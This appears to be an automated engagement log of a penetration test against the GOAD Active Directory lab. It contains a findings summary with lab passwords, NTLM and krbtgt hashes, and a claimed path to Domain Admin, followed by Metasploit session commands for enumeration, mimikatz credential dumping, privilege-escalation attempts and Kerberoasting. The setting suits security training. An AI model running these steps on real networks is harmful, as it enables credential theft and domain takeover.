# Engagement: GOAD Lab - North Domain

**Target:** NORTH domain - Initial access as jon.snow@CASTELBLACK
**Started:** 2025-12-17 11:54:59
**Status:** active
**Notes:** Starting from Meterpreter session 1 as NORTH\jon.snow on CASTELBLACK (10.50.0.22)

---

## Findings Summary

### Users (6)

- **jon.snow - Current User**: `NORTH\jon.snow | SID: S-1-5-21-2825620776-1928720347-1758113318-1118 | Groups: Night Watch, Stark | Medium Integrity` - Standard domain user, member of Night Watch and Stark groups. No admin privileges on current host.
- **jeor.mormont - Local Admin on CASTELBLACK**: `NORTH\jeor.mormont | Local Administrator on CASTELBLACK` - Potential target for privilege escalation on current host
- **Domain Admins - NORTH**: `Administrator, eddard.stark` - Ultimate targets for domain compromise
- **robb.stark - Active Session**: `NORTH\robb.stark | RDP Session ID 2 | Active on CASTELBLACK` - Credentials likely in LSASS memory - potential token theft target
- **sql_svc - Kerberoastable SQL Service**: `sql_svc | SPN: MSSQLSvc/castelblack.north.sevenkingdoms.local:1433` - High-value Kerberoasting target - SQL service accounts often have weak passwords
- **sansa.stark - Kerberoastable HTTP Service**: `sansa.stark | SPN: HTTP/eyrie.north.sevenkingdoms.local` - Kerberoasting target - HTTP service account

### Hosts (1)

- **CASTELBLACK - Compromised Host**: `10.50.0.22 | Windows Server 2019 | Domain: NORTH.sevenkingdoms.local | DC: winterfell.north.sevenkingdoms.local (10.50.0.11)`

### Others (1)

- **Forest Trust Structure**: `SEVENKINGDOMS.local (Forest Root) -> NORTH.sevenkingdoms.local (Child Domain)` - Bidirectional trust within forest - potential for cross-domain attacks

### Hashs (7)

- **sql_svc Kerberos TGS (RC4)**: `Kirbi ticket exported - MSSQLSvc/castelblack.north.sevenkingdoms.local:1433 | Base64 kirbi available for hashcat -m 13100` - Convert with kirbi2john.py and crack with hashcat. SQL service accounts often have weak passwords.
- **robb.stark - NTLM Hash**: `NORTH\robb.stark : 831486ac7f26860c9e2f51ac91e1a07a` - Dumped from LSASS - can use for pass-the-hash
- **jon.snow - NTLM Hash**: `NORTH\jon.snow : b8d76e56e9dac90539aff05e3ccb1755` - Dumped from LSASS
- **WINTERFELL Local Administrator**: `dbd13e1c4e338284ac4e9874f7de6ef4` - Local Administrator hash from DC WINTERFELL via secrets dump with S4U ticket
- **WINTERFELL$ Machine Account**: `63b06bc824052112adbb298f3bf0151e` - DC machine account hash - can be used for Silver Ticket attacks
- **krbtgt (NORTH) - Golden Ticket**: `e3e8bc543cc3da2285e6a0a4a2934d08` - krbtgt hash from DCSync - can create Golden Tickets for persistence
- **eddard.stark (Domain Admin)**: `d977b98c6c9282c5c478be1d97b237b8` - Domain Admin hash from DCSync via S4U2Proxy constrained delegation attack

### Credentials (7)

- **jeor.mormont - Local Admin**: `NORTH\jeor.mormont : _L0ngCl@w_` - Found in NETLOGON\script.ps1 - Local Admin on CASTELBLACK - Can escalate privileges!
- **sql_svc - Cleartext Password**: `NORTH\sql_svc : YouWillNotKerboroast1ngMeeeeee` - SQL Service account - dumped from LSASS as SYSTEM
- **Unknown User (T.L.) - Decrypted Secret**: `T.L. : powerkingftw135` - Decrypted from NETLOGON\secret.ps1 - Initials T.L. - possibly Tyrion/Tywin Lannister from SEVENKINGDOMS
- **samwell.tarly - Password in Description**: `NORTH\samwell.tarly : Heartsbane` - Password stored in AD user description field - classic misconfiguration!
- **tywin.lannister (SEVENKINGDOMS)**: `powerkingftw135` - Found encrypted in NETLOGON secret.ps1 - T.L. = Tywin Lannister. Valid on forest root domain SEVENKINGDOMS.
- **jon.snow (NORTH) - Kerberoasted**: `iknownothing` - Cracked from Kerberoasting TGS ticket. jon.snow is Kerberoastable (SPN set).
- **robb.stark (DefaultPassword LSA)**: `sexywolfy` - Found in LSA DefaultPassword on WINTERFELL DC

### Vulnerabilitys (1)

- **Constrained Delegation - jon.snow to CIFS/winterfell**: `jon.snow can delegate to CIFS/winterfell.north.sevenkingdoms.local - S4U2Proxy attack possible` - Can impersonate any user (including Domain Admin) to CIFS on the DC. Direct path to DA!

### Accesss (1)

- **DOMAIN ADMIN - NORTH.SEVENKINGDOMS.LOCAL**: `DCSync achieved via constrained delegation S4U2Proxy attack` - Attack path: jon.snow (Kerberoasted) -> Constrained Delegation to CIFS/winterfell -> S4U2Proxy impersonating eddard.stark -> DCSync all domain credentials

## Action Timeline

### Phase: post_exploitation

#### ✅ msf_session_interact
*2025-12-17 11:55:18* | Target: `1` | Duration: 515ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"sysinfo"}
```

**Output:**
```
Computer        : CASTELBLACK
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : NORTH
Logged On Users : 15
Meterpreter     : x64/windows

```

---

#### ✅ msf_session_interact
*2025-12-17 11:55:18* | Target: `1` | Duration: 511ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"getuid"}
```

**Output:**
```
Server username: NORTH\jon.snow

```

---

#### ✅ msf_session_interact
*2025-12-17 11:55:19* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"getprivs"}
```

**Output:**
```

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege


```

---

#### ✅ msf_session_interact
*2025-12-17 11:55:26* | Target: `1` | Duration: 512ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"ipconfig"}
```

**Output:**
```

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface  3
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter #2
Hardware MAC : 08:00:27:5d:a9:e1
MTU          : 1500
IPv4 Address : 10.50.0.22
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::b09a:3d4e:e148:b662
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface  7
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter
Hardware MAC : 08:00:27:7a:a2:fc
MTU          : 1500
IPv4 Address : 10.0.2.15
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::cae:326b:b121:674b
IPv6 Netmask : ffff:ffff:ffff:ffff::


```

---

#### ✅ msf_session_interact
*2025-12-17 11:55:27* | Target: `1` | Duration: 511ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"run post/windows/gather/enum_av"}
```

**Output:**
```
(no output)
```

---

#### ❌ msf_session_interact
*2025-12-17 11:55:27* | Target: `1` | Duration: 512ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"run post/windows/gather/enum_domain"}
```

**Output:**
```
[-] Post aborted due to failure: unknown: ERROR:
Description = Invalid namespace

```

---

#### ✅ msf_session_interact
*2025-12-17 11:55:34* | Target: `1` | Duration: 514ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"shell"}
```

**Output:**
```
[+] Domain FQDN: north.sevenkingdoms.local
[+] Domain NetBIOS Name: NORTH
[+] Domain Controller: winterfell.north.sevenkingdoms.local (IP: 10.50.0.11)
Process 1400 created.
Channel 3 created.
Microsoft Windows [Version 10.0.17763.1935]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\jon.snow\Desktop>
```

---

#### ❌ msf_session_interact
*2025-12-17 11:55:40* | Target: `1` | Duration: 8ms

**Input:**
```json
{"id":1,"type":"shell","command":"whoami /all"}
```

**Output:**
```
Error: MSF Error: true
```

---

#### ✅ msf_session_interact
*2025-12-17 11:55:46* | Target: `1` | Duration: 511ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"execute -f cmd.exe -a \"/c whoami /all\" -i"}
```

**Output:**
```
execute -f cmd.exe -a "/c whoami /all" -i
'execute' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\jon.snow\Desktop>
```

---

#### ✅ msf_session_interact
*2025-12-17 11:55:51* | Target: `1` | Duration: 511ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"whoami /all"}
```

**Output:**
```
whoami /all

USER INFORMATION
----------------

User Name      SID                                           
============== ==============================================
north\jon.snow S-1-5-21-2825620776-1928720347-1758113318-1118


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes                                        
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
NORTH\Night Watch                          Group            S-1-5-21-2825620776-1928720347-1758113318-1107 Mandatory group, E
... (truncated)
```

---

#### ✅ msf_session_interact
*2025-12-17 11:56:10* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"net localgroup administrators"}
```

**Output:**
```
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
NORTH\Domain Admins
NORTH\jeor.mormont
vagrant
The command completed successfully.


C:\Users\jon.snow\Desktop>
```

---

#### ✅ msf_session_interact
*2025-12-17 11:56:20* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"net group \"Domain Admins\" /domain"}
```

**Output:**
```
net group "Domain Admins" /domain
The request will be processed at a domain controller for domain north.sevenkingdoms.local.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            eddard.stark             
The command completed successfully.


C:\Users\jon.snow\Desktop>
```

---

#### ✅ msf_session_interact
*2025-12-17 11:56:27* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"nltest /domain_trusts"}
```

**Output:**
```
nltest /domain_trusts
List of domain trusts:
    0: SEVENKINGDOMS sevenkingdoms.local (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )
    1: NORTH north.sevenkingdoms.local (NT 5) (Forest: 0) (Primary Domain) (Native)
The command completed successfully

C:\Users\jon.snow\Desktop>
```

---

#### ✅ msf_session_interact
*2025-12-17 11:56:37* | Target: `1` | Duration: 512ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"query user"}
```

**Output:**
```
query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 robb.stark            rdp-tcp#0           2  Active    5+02:09  12/12/2025 1:46 AM
>jon.snow              rdp-tcp#1           3  Active         16  12/17/2025 3:33 AM

C:\Users\jon.snow\Desktop>
```

---

#### ✅ msf_session_interact
*2025-12-17 11:56:37* | Target: `1` | Duration: 508ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"net group \"Enterprise Admins\" /domain"}
```

**Output:**
```
net group "Enterprise Admins" /domain
The request will be processed at a domain controller for domain north.sevenkingdoms.local.

The group name could not be found.

More help is available by typing NET HELPMSG 2220.


C:\Users\jon.snow\Desktop>
```

---

#### ✅ msf_session_interact
*2025-12-17 11:56:50* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"exit"}
```

**Output:**
```
exit

```

---

#### ✅ msf_session_interact
*2025-12-17 11:56:56* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"load kiwi"}
```

**Output:**
```
Loading extension kiwi...
```

---

#### ✅ msf_session_interact
*2025-12-17 11:57:02* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"creds_all"}
```

**Output:**
```

  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
[!] Not running as SYSTEM, execution may fail

```

---

#### ❌ msf_session_interact
*2025-12-17 11:57:08* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"getsystem"}
```

**Output:**
```
[-] priv_elevate_getsystem: Operation failed: All pipe instances are busy. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)
[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)

```

---

#### ✅ msf_session_interact
*2025-12-17 11:57:16* | Target: `1` | Duration: 511ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"load incognito"}
```

**Output:**
```
Loading extension incognito...Success.

```

---

#### ✅ msf_session_interact
*2025-12-17 11:57:17* | Target: `1` | Duration: 507ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"list_tokens -u"}
```

**Output:**
```
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
NORTH\jon.snow

Impersonation Tokens Available
========================================
No tokens available


```

---

#### ✅ msf_session_interact
*2025-12-17 11:57:23* | Target: `1` | Duration: 519ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"run post/multi/recon/local_exploit_suggester"}
```

**Output:**
```
[*] 10.50.0.22 - Collecting local exploits for x64/windows...
[*] Collecting exploit 1 / 2583[*] Collecting exploit 2 / 2583[*] Collecting exploit 3 / 2583[*] Collecting exploit 4 / 2583[*] Collecting exploit 5 / 2583[*] Collecting exploit 6 / 2583[*] Collecting exploit 7 / 2583[*] Collecting exploit 8 / 2583[*] Collecting exploit 9 / 2583[*] Collecting exploit 10 / 2583[*] Collecting exploit 11 / 2583[*] Collecting exploit 12 / 2583[*] Collecting exploit 13 / 2583[*] Collecting exploit 14 / 2583[*] Collecting exploit 15 / 2583[*] Collecting exploit 16 / 2583[*] Collecting exploit 17 / 2583[*] Collecting exploit 18 / 2583[*] Collecting exploit 19 / 2583[*] Collecting exploit 20 / 2583[*] Collecting exploit 21 / 2583[*] Collecting exploit 22 / 2583[*] Collecting exploit 23 / 2583[*] Collecting exploit 24 / 2583[*] Collecting exploit 25 / 2583[*] Collecting exploit 26 / 2583[*] Collecting exploit 27 / 2583[*] Collecting exploit 28 / 2583[*] Collecting exploit 29 / 2583[*] Collecting exploit 30 / 2583[*] Collecting exploit 31 / 2583[*] Collecting exploit 32 / 2583[*] Collecting exploit 33 / 2583[*] Collecting exploit 34 / 2583[*] Collecting exploit 35 / 2583[*] Collecting exploit 36 / 2583[*] Collecting exploit 37 / 2583[*] Collecting exploit 38 / 2583[*] Collecting exploit 39 / 2583[*] Collecting exploit 40 / 2583[*] Collecting exploit 41 / 2583[*] Collecting exploit 42 / 2583[*] Collecting exploit 43 / 2583[*] Collecting exploit 44 / 2583
```

---

#### ✅ msf_session_interact
*2025-12-17 11:57:29* | Target: `1` | Duration: 515ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"run post/windows/gather/credentials/gpp"}
```

**Output:**
```
[*] Collecting exploit 45 / 2583[*] Collecting exploit 46 / 2583[*] Collecting exploit 47 / 2583[*] Collecting exploit 48 / 2583[*] Collecting exploit 49 / 2583[*] Collecting exploit 50 / 2583[*] Collecting exploit 51 / 2583[*] Collecting exploit 52 / 2583[*] Collecting exploit 53 / 2583[*] Collecting exploit 54 / 2583[*] Collecting exploit 55 / 2583[*] Collecting exploit 56 / 2583[*] Collecting exploit 57 / 2583[*] Collecting exploit 58 / 2583[*] Collecting exploit 59 / 2583[*] Collecting exploit 60 / 2583[*] Collecting exploit 61 / 2583[*] Collecting exploit 62 / 2583[*] Collecting exploit 63 / 2583[*] Collecting exploit 64 / 2583[*] Collecting exploit 65 / 2583[*] Collecting exploit 66 / 2583[*] Collecting exploit 67 / 2583[*] Collecting exploit 68 / 2583[*] Collecting exploit 69 / 2583[*] Collecting exploit 70 / 2583[*] Collecting exploit 71 / 2583[*] Collecting exploit 72 / 2583[*] Collecting exploit 73 / 2583[*] Collecting exploit 74 / 2583[*] Collecting exploit 75 / 2583[*] Collecting exploit 76 / 2583[*] Collecting exploit 77 / 2583[*] Collecting exploit 78 / 2583[*] Collecting exploit 79 / 2583[*] Collecting exploit 80 / 2583[*] Collecting exploit 81 / 2583[*] Collecting exploit 82 / 2583[*] Collecting exploit 83 / 2583[*] Collecting exploit 84 / 2583[*] Collecting exploit 85 / 2583[*] Collecting exploit 86 / 2583[*] Collecting exploit 87 / 2583[*] Collecting exploit 88 / 2583[*] Collecting exploit 89 / 2583[*] Collecting exploit 90 / 2583[*] Collecting exploit 91 / 2583[*] Collecting exploit 92 / 2583[*] Collecting exploit 93 / 2583[*] Collecting exploit 94 / 2583[*] Collecting exploit 95 / 2583[*] Collecting exploit 96 / 2583[*] Collecting exploit 97 / 2583[*] Collecting exploit 98 / 2583[*] Collecting exploit 99 / 2583[*] Collecting exploit 100 / 2583[*] Collecting exploit 101 / 2583[*] Collecting exploit 102 / 2583[*] Collecting exploit 103 / 2583[*] Collecting exploit 104 / 2583[*] Collecting 
... (truncated)
```

---

### Phase: exploitation

#### ✅ msf_module_execute
*2025-12-17 11:57:48* | Target: `10.50.0.11` | Duration: 36ms

**Input:**
```json
{"type":"auxiliary","name":"gather/get_user_spns","options":{"RHOSTS":"10.50.0.11","DOMAIN":"north.sevenkingdoms.local","USER":"jon.snow","PASS":"iknownothing"}}
```

**Output:**
```
Module launched as job 2. Use msf_job_info to check status.
```

---

### Phase: enumeration

#### ❌ msf_job_info
*2025-12-17 11:58:02* | Target: `2` | Duration: 5ms

**Input:**
```json
{"id":2}
```

**Output:**
```
Error: MSF Error: true
```

---

#### ✅ msf_jobs_list
*2025-12-17 11:58:08* | Duration: 6ms

**Input:**
```json
{}
```

**Output:**
```
{
  "0": "Exploit: multi/handler"
}
```

---

### Phase: post_exploitation

#### ❌ msf_session_interact
*2025-12-17 11:58:08* | Target: `1` | Duration: 510ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"shell"}
```

**Output:**
```
[*] Collecting exploit 679 / 2583[*] Collecting exploit 680 / 2583[*] Collecting exploit 681 / 2583[*] Collecting exploit 682 / 2583[*] Collecting exploit 683 / 2583[*] Collecting exploit 684 / 2583[*] Collecting exploit 685 / 2583[*] Collecting exploit 686 / 2583[*] Collecting exploit 687 / 2583[*] Collecting exploit 688 / 2583[*] Collecting exploit 689 / 2583[*] Collecting exploit 690 / 2583[*] Collecting exploit 691 / 2583[*] Collecting exploit 692 / 2583[*] Collecting exploit 693 / 2583[*] Collecting exploit 694 / 2583[*] Collecting exploit 695 / 2583[*] Collecting exploit 696 / 2583[*] Collecting exploit 697 / 2583[*] Collecting exploit 698 / 2583[*] Checking for group policy history objects...
[*] Collecting exploit 699 / 2583[*] Collecting exploit 700 / 2583[*] Collecting exploit 701 / 2583[*] Collecting exploit 702 / 2583[*] Collecting exploit 703 / 2583[*] Collecting exploit 704 / 2583[*] Collecting exploit 705 / 2583[*] Collecting exploit 706 / 2583[*] Collecting exploit 707 / 2583[*] Collecting exploit 708 / 2583[*] Collecting exploit 709 / 2583[*] Collecting exploit 710 / 2583[*] Collecting exploit 711 / 2583[*] Collecting exploit 712 / 2583[*] Collecting exploit 713 / 2583[*] Collecting exploit 714 / 2583[*] Collecting exploit 715 / 2583[*] Collecting exploit 716 / 2583[*] Collecting exploit 717 / 2583[*] Collecting exploit 718 / 2583[*] Collecting exploit 719 / 2583[*] Collecting exploit 720 / 2583[*] Collecting exploit 721 / 2583[*] Collecting exploit 722 / 2583[*] Collecting exploit 723 / 2583[*] Collecting exploit 724 / 2583[-] Error accessing C:\ProgramData\Microsoft\Group Policy\History : stdapi_fs_ls: Operation failed: The system cannot find the path specified.
[*] Checking for SYSVOL locally...
[*] Collecting exploit 725 / 2583[*] Collecting exploit 726 / 2583[*] Collecting exploit 727 / 2583[*] Collecting exploit 728 / 2583[*] Collecting exploit 729 / 2583[*] Collecting exploit 730 / 2583[*] C
... (truncated)
```

---

#### ✅ msf_session_interact
*2025-12-17 11:58:47* | Target: `1` | Duration: 509ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"setspn -T north.sevenkingdoms.local -Q */*"}
```

**Output:**
```
setspn -T north.sevenkingdoms.local -Q */*
Checking domain DC=north,DC=sevenkingdoms,DC=local
CN=krbtgt,CN=Users,DC=north,DC=sevenkingdoms,DC=local
	kadmin/changepw
CN=sansa.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
	HTTP/eyrie.north.sevenkingdoms.local
CN=jon.snow,CN=Users,DC=north,DC=sevenkingdoms,DC=local
	CIFS/thewall.north.sevenkingdoms.local
	HTTP/thewall.north.sevenkingdoms.local
CN=sql_svc,CN=Users,DC=north,DC=sevenkingdoms,DC=local
	MSSQLSvc/castelblack.north.sevenkingdoms.local
	MSSQLSvc/castelblack.north.sevenkingdoms.local:1433
CN=CASTELBLACK,CN=Computers,DC=north,DC=sevenkingdoms,DC=local
	HTTP/winterfell.north.sevenkingdoms.local
	TERMSRV/CASTELBLACK
	TERMSRV/castelblack.north.sevenkingdoms.local
	RestrictedKrbHost/CASTELBLACK
	HOST/CASTELBLACK
	RestrictedKrbHost/castelblack.north.sevenkingdoms.local
	HOST/castelblack.north.sevenkingdoms.local
CN=WINTERFELL,OU=Domain Controllers,DC=north,DC=sevenkingdoms,DC=local
	ldap/winterfell.north.sevenkingdoms.local/DomainDnsZones.north.sevenkingdoms.local
	ldap/winterfell.north.sevenkingdoms.local/ForestDnsZones.sevenkingdoms.local
	TERMSRV/WINTERFELL
	TERMSRV/winterfell.north.sevenkingdoms.local
	Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/winterfell.north.sevenkingdoms.local
	DNS/winterfell.north.sevenkingdoms.local
	GC/winterfell.north.sevenkingdoms.local/sevenkingdoms.local
	RestrictedKrbHost/winterfell.north.sevenkingdoms.local
	RestrictedKrbHost/WINTERFELL
	RPC/767e3975-498b-4c3d-82b1-21b329c988f8._msdcs.sevenkingdoms.local
	HOST/WINTERFELL/NORTH
	HOST/winterfell.north.sevenkingdoms.local/NORTH
	HOST/WINTERFELL
	HOST/winterfell.north.sevenkingdoms.local
	HOST/winterfell.north.sevenkingdoms.local/north.sevenkingdoms.local
	E3514235-4B06-11D1-AB04-00C04FC2DCD2/767e3975-498b-4c3d-82b1-21b329c988f8/north.sevenkingdoms.local
	ldap/WINTERFELL/NORTH
	ldap/767e3975-498b-4c3d-82b1-21b329c988f8._msdcs.sevenkingdoms.local
	ldap/winterfell.north.sevenkingdoms.local/NORTH
	ldap/WI
... (truncated)
```

---

#### ✅ msf_session_interact
*2025-12-17 11:59:00* | Target: `1` | Duration: 507ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"powershell -ep bypass -c \"Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/castelblack.north.sevenkingdoms.local:1433'\""}
```

**Output:**
```
powershell -ep bypass -c "Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/castelblack.north.sevenkingdoms.local:1433'"

```

---

#### ✅ msf_session_interact
*2025-12-17 11:59:06* | Target: `1` | Duration: 507ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"klist"}
```

**Output:**
```


Id                   : uuid-8499275d-b551-45ec-9a4f-9b109c932efb-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 12/17/2025 11:59:00 AM
ValidTo              : 12/17/2025 9:33:40 PM
ServicePrincipalName : MSSQLSvc/castelblack.north.sevenkingdoms.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey




C:\Users\jon.snow\Desktop>klist

Current LogonId is 0:0x7b0dcef

Cached Tickets: (8)

#0>	Client: jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
	Server: krbtgt/NORTH.SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize 
	Start Time: 12/17/2025 3:33:40 (local)
	End Time:   12/17/2025 13:33:40 (local)
	Renew Time: 12/24/2025 3:33:40 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x2 -> DELEGATION 
	Kdc Called: winterfell.north.sevenkingdoms.local

#1>	Client: jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
	Server: krbtgt/NORTH.SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
	Start Time: 12/17/2025 3:33:40 (local)
	End Time:   12/17/2025 13:33:40 (local)
	Renew Time: 12/24/2025 3:33:40 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: winterfell.north.sevenkingdoms.local

#2>	Client: jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
	Server: MSSQLSvc/castelblack.north.sevenkingdoms.local:1433 @ NORTH.SEVENKINGDOMS.LOCAL
	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
	Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize 
	Start Time: 12/17/2025 3:59:00 (local)
	End Time:   12/17/2025 13:33:40 (local)
	Renew Time: 12/24/2025 3:33:40 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)
	Cache Flags: 0 
... (truncated)
```

---

#### ✅ msf_session_interact
*2025-12-17 11:59:13* | Target: `1` | Duration: 506ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"kiwi_cmd \"kerberos::list /export\""}
```

**Output:**
```
kiwi_cmd "kerberos::list /export"
'kiwi_cmd' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\jon.snow\Desktop>
```

---

#### ✅ msf_session_interact
*2025-12-17 11:59:18* | Target: `1` | Duration: 506ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"exit"}
```

**Output:**
```
exit

```

---

#### ✅ msf_session_interact
*2025-12-17 11:59:24* | Target: `1` | Duration: 506ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"kerberos_ticket_list"}
```

**Output:**
```
[+] Kerberos tickets found in the current session.
[00000000] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 3:33:40 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : krbtgt/NORTH.SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 

[00000001] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 3:33:40 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : krbtgt/NORTH.SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 

[00000002] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 12/17/2025 3:59:00 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : MSSQLSvc/castelblack.north.sevenkingdoms.local:1433 @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 

[00000003] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 3:56:20 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : cifs/winterfell.north.sevenkingdoms.local @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000004] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 3:33:43 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : ProtectedStorage/winterfell.north.sevenkingdoms.local @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000005] - 0
... (truncated)
```

---

#### ✅ msf_session_interact
*2025-12-17 11:59:30* | Target: `1` | Duration: 506ms

**Input:**
```json
{"id":1,"type":"meterpreter","command":"kiwi_cmd kerberos::list"}
```

**Output:**
```

